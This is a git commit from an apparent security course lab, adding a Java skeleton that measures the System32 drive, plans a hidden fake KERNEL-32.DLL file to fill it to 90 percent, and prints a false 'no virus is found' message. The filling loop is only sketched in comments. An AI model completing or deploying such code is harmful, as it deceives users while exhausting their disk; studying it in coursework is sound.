24a8235c502baad1271e831ab03ae1a52ccfee04
robotsdancing <robotsdancing@gmail.com>
2017-02-19 17:55:21 -0700

    I'll work on this some more tonight.
    I added calculating the directory size, print statements for making sure the sizes are right, and comments for the stuff i did and some other stuff that i'll get to.
    I'll work on this more tonight, but I was gonna eat dinner and maybe work on some other homework, so I figured I should upload what i've done in case you needed to see/use it.

--- src/csci476/lab3/Main.java
+++ src/csci476/lab3/Main.java
@@ -1,8 +1,33 @@
 package csci476.lab3;
-
+import java.io.*;
 public class Main {
 
     public static void main(String[] args) {
 	// write your code here
+        File rootDrive = new File("/Windows/System32");
+        //set the rootDrive to be System32, i have %systemroot% that way because I assume that will work
+        long rootDriveTotalSize = rootDrive.getTotalSpace();
+        //retrieves the total space of System 32
+        long rootDriveFillableSize = (long)(rootDriveTotalSize*.90)-rootDrive.getUsableSpace();
+        //calculates 90% of space of drive and removes free space so you get the amount of space needed to make the drive 90% full.
+
+        //create hidden dummy .dll file KERNEL-32.DLL
+
+        System.out.println("Tota disk size: "+ rootDriveTotalSize);
+        System.out.println("Usable space: "+ rootDrive.getUsableSpace());
+        System.out.println("size to be filled up: " + rootDriveFillableSize);
+        //The above three lines are for debugging.
+
+
+
+        /*
+        while(DLL <= rootDriveFillableSize){
+            //write stuff to the file.
+        }
+
+
+        */
+        System.out.println("The scanning finished and no virus is found!");
+        //tell the user they have no viruses.
     }
 }
